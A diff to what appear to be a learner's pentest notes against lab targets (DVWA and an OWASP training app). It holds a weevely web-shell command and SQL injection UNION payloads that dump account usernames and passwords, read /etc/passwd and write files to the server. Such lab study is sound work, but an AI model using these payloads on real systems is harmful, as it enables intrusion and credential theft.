@@ -93,7 +93,10 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 [+] {' union select 1,2,3,4,5%23}/{' union select 1,database(),user(),version(),5%23} -- to specify SQL data
 - union select 1,database(),user(),version(),5%23 ---dispaly other table set
 - union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10'%23 -- specify databse info to display
-- 
+- union select 1,table_name,null,null,5 from information_schema.columns where table_name = 'accounts'%23 -- selected tables
+- union select 1,username,password,is_admin,5 from accounts%23 ---extract sensitive information
+- union select null,load_file('/etc/passwd'),null,null,null%23 ---get /etc/passwd files
+- union select null,'example example',null,null,null into outfile '/tmp/example.txt'%23 --write to server
 [+] 
 
 
